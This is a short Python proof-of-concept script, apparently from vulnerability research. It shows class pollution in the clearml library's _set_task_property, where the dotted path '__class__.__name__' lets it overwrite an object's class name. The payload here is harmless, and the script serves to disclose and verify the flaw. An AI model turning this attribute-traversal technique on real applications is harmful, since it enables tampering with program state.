# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: _set_task_property
# Type: get-attr-set-attr

from clearml.backend_interface.task.access import AccessMixin

class Target: pass
target = Target()

class MockMixin(AccessMixin):
  @property
  def data(self):
    return target
  @property
  def log(self):
    return None

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  mixin = MockMixin.__new__(MockMixin)
  mixin._set_task_property(PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
